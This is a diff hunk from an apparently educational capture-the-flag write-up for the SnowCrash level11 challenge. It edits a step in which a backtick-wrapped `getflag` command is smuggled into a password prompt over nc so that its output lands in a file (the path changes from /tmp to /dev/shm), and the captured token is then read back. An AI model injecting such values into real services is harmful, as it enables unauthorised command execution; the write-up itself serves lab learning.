@@ -55,8 +55,8 @@ Let's see if we can exploit that, by tricking it to run ```getflag``` in the pla
 We'll use ```nc``` to establish a TCP connection with remote server. 
 ```
 level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password: `getflag` > /tmp/token
+Password: `getflag` > /dev/shm/token
 Erf nope..
-level11@SnowCrash:~$ cat /tmp/token
+level11@SnowCrash:~$ cat /dev/shm/token
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
